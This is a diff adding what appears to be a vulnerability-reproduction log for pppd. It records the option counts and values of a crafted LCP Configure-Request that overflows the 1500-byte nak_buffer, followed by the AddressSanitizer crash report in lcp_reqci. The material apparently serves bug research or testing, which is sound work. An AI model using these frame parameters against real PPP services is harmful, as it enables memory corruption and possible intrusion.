@@ -1,0 +1,18 @@
+=== w123-asan-vuln-t1500 ===
+binary=build-vuln/pppd/pppd
+target_offset=1500
+pap_cis=8 async_cis=244
+info_len=1500 nak_bytes=1504
+ci_value=50574e32 expected_nak_value=50574e33
+process_rc=1 survived_window=False
+frame_sha256=a882cf149e3130942919064834e096a54fbcd77247ee0b7347f4a53fbd58e048
+rcvd [LCP ConfReq: rcvd [LCP ConfReq id=0x1 <auth pap> <auth pap> <auth pap> <auth pap> <auth pap> <auth pap> <auth pap> <auth pap> <asyncmap 0x50574e32> <asyncmap 0x50574e32> <asyncmap 0x50574e32> <asyncmap 0x50574e32> <asyncmap 0x50574e32> <asyncm
+sent [LCP ConfNak: none
+asan/control: ==PID==ERROR: AddressSanitizer: global-buffer-overflow on address 0xADDR at pc 0xADDR bp 0xADDR sp 0xADDR
+asan/control: WRITE of size 1 at 0xADDR thread T0
+asan/control:     #0 0xADDR in lcp_reqci BUILD/pppd/lcp.c:1568
+asan/control:     #2 0xADDR in fsm_input BUILD/pppd/fsm.c:365
+asan/control:     #4 0xADDR in get_input BUILD/pppd/main.c:1207
+asan/control: 0xADDR is located 0 bytes after global variable 'nak_buffer' defined in 'lcp.c:221:15' (0xADDR) of size 1500
+asan/control: SUMMARY: AddressSanitizer: global-buffer-overflow BUILD/pppd/lcp.c:1568 in lcp_reqci
+gdb_memory:
